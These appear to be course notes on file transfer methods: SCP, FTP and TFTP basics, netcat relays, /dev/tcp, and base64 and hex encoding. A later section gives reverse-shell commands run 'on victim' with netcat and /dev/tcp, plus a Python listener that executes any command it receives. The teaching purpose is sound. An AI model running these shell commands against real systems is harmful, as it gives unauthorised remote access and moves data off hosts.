@@ -1,0 +1,326 @@
+common methods for transferring data:
+    TFTP
+    FTP
+      - Active
+      - Passive
+    FTPS
+    SFTP
+    SCP
+--------------------------------------------------------------------------------------------------------------
+TFTP
+Trivial File Transfer Protocol
+    RFC 1350 Rev2
+    UDP transport
+    Extremely small and very simple communication
+    No terminal communication
+    Insecure (no authentication or encryption)
+    No directory services
+    Used often for technologies such as BOOTP and PXE
+
+FTP
+File Transfer Protocol
+    RFC 959
+    Uses 2 separate TCP connections
+    Control Connection (21) / Data Connection (20*)
+    Authentication in clear-text
+    Insecure in default configuration
+    Has directory services
+    Anonymous login
+
+FTP Active
+ftpa
+
+SCP
+Secure Copy Protocol
+    TCP Transport (port 22)
+    Uses symmetric and asymmetric encryption
+    Authentication through sign in (username and password) or with SSH key
+    Non-Interactive
+
+SCP Options:
+.  - Present working directory
+-v - verbose mode
+-P - alternate port
+-r - recursively copy an entire directory
+-3 - 3-way copy
+
+Conduct Uncommon Methods of File Transfer
+    Demonstrate the use of Netcat for data transfer
+    Perform traffic redirection using Netcat relays
+    Discuss the use of named and unnamed pipes
+    Conduct file transfers using /dev/tcp
+
+=============================================================================================================================
+FTP Passive with Wget:
+proxychains wget -r ftp://<Your.Ftp.Server.Addr>
+-----------------------------------------------------------------------------------------------------------------------------
+FTPS
+File Transfer Protocol Secure
+    Adds SSL/TLS encryption to FTP
+    Interactive terminal access
+    Explicit Mode: ports 20/21*
+        Option for Encryption
+    Implicit Mode: ports 989/990*
+        Encrytion assumed
+
+SFTP
+Secure File Transfer Protocol
+    TCP transport (port 22)
+    Uses symmetric and asymmetric encryption
+    Adds FTP like services to SSH
+    Authentication through sign in (username and password) or with SSH key
+    Interactive terminal access
+=============================================================================================================================
+SCP Options:
+.  - Present working directory
+-v - verbose mode
+-P - alternate port
+-r - recursively copy an entire directory
+-3 - 3-way copy
+
+SCP Syntax
+Download a file from a remote directory to a local directory:
+$ scp student@172.16.82.106:secretstuff.txt /home/student
+-----------------------------------------------------------------------------------------------------------------------------
+Upload a file to a remote directory from a local directory:
+$ scp secretstuff.txt student@172.16.82.106:/home/student
+-----------------------------------------------------------------------------------------------------------------------------
+Copy a file from a remote host to a separate remote host:
+$ scp -3 student@172.16.82.106:/home/student/secretstuff.txt student@172.16.82.112:/home/student
+password:    password:
+-----------------------------------------------------------------------------------------------------------------------------
+SCP Syntax
+Recursive upload of a folder to remote:
+$ scp -r folder/ student@172.16.82.106:
+-----------------------------------------------------------------------------------------------------------------------------
+Recursive download of a folder from remote:
+$ scp -r student@172.16.82.106:folder/ .
+-----------------------------------------------------------------------------------------------------------------------------
+SCP Syntax w/ alternate SSHD
+
+Download a file from a remote directory to a local directory:
+$ scp -P 1111 student@172.16.82.106:secretstuff.txt .
+^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+Upload a file to a remote directory from a local directory:
+$ scp -P 1111 secretstuff.txt student@172.16.82.106:
+-----------------------------------------------------------------------------------------------------------------------------
+SCP Syntax through a tunnel
+Create a local port forward to target device:
+$ ssh student@172.16.82.106 -L 1111:localhost:22 -NT
+^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+Download a file from a remote directory to a local directory:
+$ scp -P 1111 student@localhost:secretstuff.txt /home/student
+^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+Upload a file to a remote directory from a local directory:
+$ scp -P 1111 secretstuff.txt student@localhost:/home/student
+-----------------------------------------------------------------------------------------------------------------------------
+SCP Syntax through a Dynamic Port forward
+Create a Dynamic Port Forward to target device:
+$ ssh student@172.16.82.106 -D 9050 -NT
+^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+Download a file from a remote directory to a local directory:
+$ proxychains scp student@localhost:secretstuff.txt .
+^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+Upload a file to a remote directory from a local directory:
+$ proxychains scp secretstuff.txt student@localhost:
+=============================================================================================================================
+=============================================================================================================================
+NETCAT
+
+NETCAT simply reads and writes data across network socket connections using the TCP/IP protocol.
+    Can be used for the following:
+        inbound and outbound connections, TCP/UDP, to or from any port
+        troubleshooting network connections
+        sending/receiving data (insecurely)
+        port scanning (similar to -sT in Nmap)
+-----------------------------------------------------------------------------------------------------------------------------
+NETCAT: Client to Listener file transfer
+    Listener (receive file):
+nc -lvp 9001 > newfile.txt
+    Client (sends file):
+nc 172.16.82.106 9001 < file.txt
+^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+NETCAT: Listener to Client file transfer
+    Listener (sends file):
+nc -lvp 9001 < file.txt
+    Client (receive file):
+nc 172.16.82.106 9001 > newfile.txt
+-----------------------------------------------------------------------------------------------------------------------------
+NETCAT Relay Demos
+Listener - Listener
+    On Blue_Host-1 Relay:
+$ mknod mypipe p
+$ nc -lvp 1111 < mypipe | nc -lvp 3333 > mypipe
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+    On Internet_Host (send):
+$ nc 172.16.82.106 1111 < secret.txt
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+    On Blue_Priv_Host-1 (receive):
+$ nc 192.168.1.1 3333 > newsecret.txt
+-----------------------------------------------------------------------------------------------------------------------------
+Client - Client
+    On Internet_Host (send):
+$ nc -lvp 1111 < secret.txt
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+    On Blue_Priv_Host-1 (receive):
+$ nc -lvp 3333 > newsecret.txt
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+    On Blue_Host-1 Relay:
+$ mknod mypipe p
+$ nc 10.10.0.40 1111 < mypipe | nc 192.168.1.10 3333 > mypipe
+-----------------------------------------------------------------------------------------------------------------------------
+Client - Listener
+    On Internet_Host (send):
+$ nc -lvp 1111 < secret.txt
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+    On Blue_Priv_Host-1 (receive):
+$ nc 192.168.1.1 3333 > newsecret.txt
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+    On Blue_Host-1 Relay:
+$ mknod mypipe p
+$ nc 10.10.0.40 1111 < mypipe | nc -lvp 3333 > mypipe
+=============================================================================================================================
+File Transfer with /dev/tcp:
+    On the receiving box:
+$ nc -lvp 1111 > devtcpfile.txt
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+    On the sending box:
+$ cat secret.txt > /dev/tcp/10.10.0.40/1111
+    This method is useful for a host that does not have NETCAT available.
+=============================================================================================================================
+=============================================================================================================================
+Reverse shell using NETCAT
+
+    First listen for the shell on your device:
+$ nc -lvp 9999
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+    On Victim using -c :
+$ nc -c /bin/bash 10.10.0.40 9999
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+    On Victim using -e :
+$ nc -e /bin/bash 10.10.0.40 9999
+-----------------------------------------------------------------------------------------------------------------------------
+Reverse shell using /DEV/TCP
+    First listen for the shell on your device:
+$ nc -lvp 9999
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+    On Victim:
+$ /bin/bash -i > /dev/tcp/10.10.0.40/9999 0<&1 2>&1
+-----------------------------------------------------------------------------------------------------------------------------
+Reverse shell Python3
+
+#!/usr/bin/python3
+import socket
+import subprocess
+PORT = 1234        # Choose an unused port
+print ("Waiting for Remote connections on port:", PORT, "\n")
+server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+server.bind(('', PORT))
+server.listen()
+while True:
+    conn, addr = server.accept()
+    with conn:
+        print('Connected by', addr)
+        while True:
+            data = conn.recv(1024).decode()
+            if not data:
+                break
+            proc = subprocess.Popen(data.strip(), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+            output, err = proc.communicate()
+            response = output.decode() + err.decode()
+            conn.sendall(response.encode())
+server.close()
+=============================================================================================================================
+Packing and Encoding  --
+
+Packers:
+    Special code added to programs to compress executables
+    Reduces network traffic
+    Used for obfuscation
+    Reduces time on target
+    Example: UPX
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+Encoding and Decoding:
+    Specialized formatting
+    Used for transmission and storage
+    Hex and Base64 are the most common
+    NOT Compression
+    NOT Encapsulation
+    NOT Encryption
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+Hexadecimal Encoding and Decoding:
+    Converts the binary representation of a data set to the 2 digit base-16 equivalent.
+    Used by IPv6 and MAC addresses
+    Color schemes
+    Increases readability and information density
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+xxd example:
+    echo a string of text and use xxd to convert it to a plain hex dump with the -p switch\ :
+$ echo "Hex encoding test" | xxd -p
+48657820656e636f64696e6720746573740a
+
+    echo hex string and use xxd to restore the data to its original format :
+$ echo "48657820656e636f64696e6720746573740a" | xxd -r -p
+Hex encoding test
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+Base64 Encoding and Decoding:
+    binary-to-text encoding
+    A-Z, a-z, 1-9, +, /
+    6 bits per non-final digit
+    (4) 6-bit groups per (3) 8-bit groups
+    padding used to fill in any unused space in each 24-bit group
+-----------------------------------------------------------------------------------------------------------------------------
+Transfer file with Base64:
+    generate the base64 output of a file, with line wrapping removed
+$ base64 -w0 logoCyber.png
+    (copy the output)
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+Transfer file with Base64:
+    create a new file on your machine
+$ nano b64image.png
+paste, save & exit
+    decode from base64 with -d:
+$ base64 -d b64image.png > logoCyber.png
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
